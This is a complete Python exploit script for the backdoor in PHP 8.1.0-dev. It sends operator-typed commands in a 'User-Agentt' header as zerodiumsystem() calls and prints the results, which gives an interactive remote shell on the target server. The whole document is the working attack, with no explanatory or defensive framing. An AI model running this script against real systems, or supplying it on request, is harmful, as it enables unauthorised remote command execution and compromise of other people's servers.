# Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                                                                                   
#!/usr/bin/env python3                                                                                                                                                                                           
import sys                                                                                                                                                                                                       
import requests                                                                                                                                                                                                  
import signal                                                                                                                                                                                                    
                                                                                                                                                                                                                 
def def_handler(sig, frame):                                                                                                                                                                                     
    print("\n[!] Closing program...\n")                                                                                                                                                                          
    sys.exit(1)                                                                                                                                                                                                  
                                                                                                                                                                                                                 
# Crtl+C                                                                                                                                                                                                         
signal.signal(signal.SIGINT, def_handler)                                                                                                                                                                        
                                                                                                                                                                                                                 
                                                                                                                                                                                                                 
url = input("[+] Enter host url: ")                                                                                                                                                                              
                                                                                                                                                                                                                 
def makeRequest():                                                                                                                                                                                               
    s = requests.session()                                                                                                                                                                                       
    r = s.get(url)                                                                                                                                                                                               
                                                                                                                                                                                                                 
    if str(r) == '<Response [200]>':                                                                                                                                                                             
        print("\n[*] Interactive Shell created.")                                                                                                                                                                
        while 1:                                                                                                                                                                                                 
            cmd = input("$ ")                                                                                                                                                                                    
            headers = {                                                                                                                                                                                          
            "User-Agentt": "zerodiumsystem('" + cmd + "');"                                                                                                                                                      
            }                                                                                                                                                                                                    
            r = s.get(url, headers = headers)                                                                                                                                                                    
            out_page = r.text.split('<!DOCTYPE html>', 1)[0]                                                                                                                                                     
            print(out_page)                                                                                                                                                                                      
                                                                                                                                                                                                                 
if __name__ == '__main__':
    makeRequest()
